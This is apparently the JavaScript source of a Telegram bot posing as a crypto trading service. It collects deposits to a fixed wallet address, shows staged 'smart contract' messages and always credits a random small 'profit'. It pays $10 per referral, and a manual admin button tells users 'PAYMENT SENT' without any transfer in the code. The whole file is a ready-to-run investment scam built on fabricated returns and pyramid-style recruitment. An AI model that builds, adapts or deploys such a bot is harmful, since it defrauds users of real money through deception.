require('dotenv').config();
const { Telegraf, Markup, session } = require('telegraf');
const express = require('express');
const mongoose = require('mongoose');
const cron = require('node-cron');

const app = express();
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const ADMIN_ID = process.env.ADMIN_ID; 
const BEP20_ADDRESS = "0x2784B4515D98C2a3Dbf59ebAAd741E708B6024ba";

// --- DATABASE CONNECTION ---
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("💎 100% Correct: Database Connected"))
  .catch(err => console.error("❌ DB Error:", err));

const userSchema = new mongoose.Schema({
    userId: { type: String, unique: true },
    username: String,
    balance: { type: Number, default: 0 },
    deposited: { type: Number, default: 0 },
    referrals: { type: Number, default: 0 },
    lastPlayed: { type: Number, default: 0 }
});
const User = mongoose.model('User', userSchema);

// Important: Session middleware for multi-step withdrawal
bot.use(session());

// --- 🔱 PREMIUM INTERFACE ---
bot.start(async (ctx) => {
    const userId = ctx.from.id.toString();
    const refId = ctx.startPayload;
    let user = await User.findOne({ userId });

    if (!user) {
        user = new User({ userId, username: ctx.from.username || ctx.from.first_name });
        if (refId && refId !== userId) {
            let referrer = await User.findOne({ userId: refId });
            if (referrer) {
                referrer.referrals += 1;
                referrer.balance += 10;
                await referrer.save();
                bot.telegram.sendMessage(refId, `🎊 <b>Bonus!</b> You earned <b>$10</b> for a new partner!`, { parse_mode: 'HTML' });
            }
        }
        await user.save();
    }

    ctx.replyWithHTML(
        `🔱 <b>BITCOINFUN ELITE v2.0</b> 🔱\n` +
        `<i>Smart Contract Trading System Active</i>\n\n` +
        `💰 Net Worth: <b>$${user.balance.toFixed(2)}</b>\n` +
        `💎 Account: <b>ELITE MEMBER</b>\n` +
        `👥 Network: <b>${user.referrals} Partners</b>\n\n` +
        `⚡️ <b>WIN UP TO $100 IN ONE CHANCE!</b>`,
        Markup.inlineKeyboard([
            [Markup.button.callback('➕ ADD CAPITAL ($35)', 'deposit')],
            [Markup.button.callback('🚀 START SIGNAL (RANDOM WIN)', 'game')],
            [Markup.button.callback('💳 CASH OUT', 'withdraw')],
            [Markup.button.callback('🤝 AFFILIATE PROGRAM', 'refer')],
            [Markup.button.callback('🛠 LIVE SUPPORT', 'support_chat')]
        ])
    );
});

// --- 📉 TRADING LOGIC ($1 - $8 RANDOM) ---
bot.action('game', (ctx) => {
    ctx.replyWithHTML("📈 <b>SIGNAL ANALYSIS</b>\nChoose BTC Direction:", 
    Markup.inlineKeyboard([[Markup.button.callback('🟢 BULLISH (UP)', 'start_trade'), Markup.button.callback('🔴 BEARISH (DOWN)', 'start_trade')]]));
});

bot.action('start_trade', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = await User.findOne({ userId });

    if (user.balance < 35) return ctx.answerCbQuery("❌ Minimum $35 balance required!", { show_alert: true });

    const cooldown = 12 * 60 * 60 * 1000;
    if (Date.now() - user.lastPlayed < cooldown) {
        return ctx.answerCbQuery("⏳ Next signal in 12 hours!", { show_alert: true });
    }

    user.lastPlayed = Date.now();
    await user.save();

    await ctx.editMessageText("🔄 <b>Connecting to Liquidity Pool...</b>", { parse_mode: 'HTML' });
    setTimeout(() => ctx.editMessageText("⚡️ <b>Executing Smart Contract...</b>", { parse_mode: 'HTML' }), 10000);
    
    setTimeout(async () => {
        const profit = Math.floor(Math.random() * 8) + 1;
        user.balance += profit;
        await user.save();
        ctx.editMessageText(`🎊 <b>TRADE COMPLETE!</b>\n\nResult: <b>PROFIT</b>\nGain: <b>+$${profit}.00</b>\nNew Balance: <b>$${user.balance.toFixed(2)}</b>`, { parse_mode: 'HTML' });
    }, 20000);
});

// --- 💳 WITHDRAWAL SYSTEM (5% FEE + ADDRESS) ---
bot.action('withdraw', async (ctx) => {
    const user = await User.findOne({ userId: ctx.from.id.toString() });
    if (user.balance < 30) return ctx.answerCbQuery("❌ Min $30 needed!", { show_alert: true });
    
    ctx.replyWithHTML(`💸 <b>CASH OUT</b>\nAvailable: $${user.balance.toFixed(2)}\nFee: <b>5%</b>\n\n<b>STEP 1:</b> Enter amount:`);
    ctx.session.wd_step = 'amount';
});

// --- 🛠 MESSAGE HANDLER (SUPPORT + WITHDRAWAL + ADMIN REPLY) ---
bot.on('text', async (ctx) => {
    const userId = ctx.from.id.toString();

    // 1. Admin Reply Logic
    if (userId === ADMIN_ID && ctx.message.reply_to_message) {
        const replyText = ctx.message.reply_to_message.text || "";
        const targetUserId = replyText.split("ID: ")[1]?.split("\n")[0];
        if (targetUserId) return bot.telegram.sendMessage(targetUserId, `👨‍💻 <b>Admin Support:</b>\n\n${ctx.message.text}`, { parse_mode: 'HTML' });
    }

    const user = await User.findOne({ userId });
    if (!user) return;

    // 2. Withdrawal Step 1: Amount
    if (ctx.session?.wd_step === 'amount') {
        const amt = parseFloat(ctx.message.text);
        if (isNaN(amt) || amt < 30 || amt > user.deposited) return ctx.reply("❌ Invalid Amount or Limit Exceeded.");
        ctx.session.wd_amt = amt;
        ctx.session.wd_step = 'address';
        return ctx.replyWithHTML("📍 <b>STEP 2:</b> Paste your <b>BEP20 (BSC)</b> Wallet Address:");
    }

    // 3. Withdrawal Step 2: Address
    if (ctx.session?.wd_step === 'address') {
        const address = ctx.message.text;
        const amt = ctx.session.wd_amt;
        const fee = amt * 0.05;
        const finalAmt = amt - fee;
        ctx.session.wd_step = null;

        bot.telegram.sendMessage(ADMIN_ID, 
            `🚨 <b>WITHDRAWAL REQUEST</b>\n\n` +
            `👤 User: @${ctx.from.username}\n` +
            `🆔 ID: ${userId}\n` +
            `💰 Gross: $${amt}\n` +
            `⛽️ Fee: $${fee}\n` +
            `💵 <b>Payable: $${finalAmt.toFixed(2)}</b>\n\n` +
            `📍 <b>WALLET:</b> <code>${address}</code>`,
            Markup.inlineKeyboard([[Markup.button.callback('✅ Confirm Payment', `wd_app_${userId}_${amt}`)]])
        );
        return ctx.replyWithHTML(`✅ <b>SUBMITTED!</b>\n\n$${finalAmt.toFixed(2)} will be sent after verification.`);
    }

    // 4. Support Chat
    if (ctx.session?.waitingForSupport) {
        ctx.session.waitingForSupport = false;
        bot.telegram.sendMessage(ADMIN_ID, `🆘 <b>NEW TICKET</b>\nFrom: @${ctx.from.username}\nID: ${userId}\n\nMsg: ${ctx.message.text}`);
        return ctx.reply("✅ Support ticket opened. Please wait for Admin reply.");
    }
});

// --- ADMIN CALLBACKS (APPROVE DEPOSIT/WITHDRAW) ---
bot.action(/wd_app_(\d+)_([\d.]+)/, async (ctx) => {
    const [_, uid, amt] = ctx.match;
    const user = await User.findOne({ userId: uid });
    if (user) {
        user.balance -= parseFloat(amt);
        await user.save();
        bot.telegram.sendMessage(uid, `🎊 <b>PAYMENT SENT!</b>\nYour withdrawal has been processed. Check your wallet!`, { parse_mode: 'HTML' });
        ctx.editMessageText(`✅ Successfully Paid to ${uid}`);
    }
});

bot.action('support_chat', (ctx) => {
    ctx.session.waitingForSupport = true;
    ctx.reply("📝 Please type your message for the Admin:");
});

// --- DEPOSIT SYSTEM ---
bot.action('deposit', (ctx) => {
    ctx.replyWithHTML(`💳 <b>CAPITAL DEPOSIT</b>\nAddress: <code>${BEP20_ADDRESS}</code>\n\nSend $35+ and click below.`,
    Markup.inlineKeyboard([[Markup.button.callback('📩 I have transferred funds', 'send_ss')]]));
});

bot.action('send_ss', (ctx) => {
    ctx.session.waitingForSS = true;
    ctx.reply("📸 Upload your screenshot (Photo/File) now:");
});

bot.on(['photo', 'document'], async (ctx) => {
    if (ctx.session?.waitingForSS) {
        ctx.session.waitingForSS = false;
        const fileId = ctx.message.photo ? ctx.message.photo[ctx.message.photo.length - 1].file_id : ctx.message.document.file_id;
        ctx.reply("⏳ Verifying your payment...");
        bot.telegram.sendPhoto(ADMIN_ID, fileId, {
            caption: `💰 DEPOSIT REQUEST\nUser: @${ctx.from.username}\nID: ${ctx.from.id}`,
            ...Markup.inlineKeyboard([[Markup.button.callback('✅ Approve $35', `approve_${ctx.from.id}_35`)]])
        });
    }
});

bot.action(/approve_(\d+)_(\d+)/, async (ctx) => {
    const [_, uid, amt] = ctx.match;
    await User.findOneAndUpdate({ userId: uid }, { $inc: { balance: parseInt(amt), deposited: parseInt(amt) } });
    bot.telegram.sendMessage(uid, `🥳 Capital of $${amt} Added! Start trading now!`);
    ctx.editMessageCaption("✅ Approved");
});

// --- ADMIN BROADCAST ---
bot.command('broadcast', async (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return;
    const msg = ctx.message.text.split('/broadcast ')[1];
    if (!msg) return ctx.reply("Usage: /broadcast [msg]");
    const users = await User.find();
    users.forEach(u => bot.telegram.sendMessage(u.userId, msg, { parse_mode: 'HTML' }).catch(() => {}));
    ctx.reply("📢 Broadcast sent!");
});

// --- KEEP ALIVE ---
app.get('/', (req, res) => res.send('System Status: 100% Correct'));
app.listen(process.env.PORT || 3000, "0.0.0.0");
bot.launch().then(() => console.log("🚀 Elite Bot Live & Correct!"));
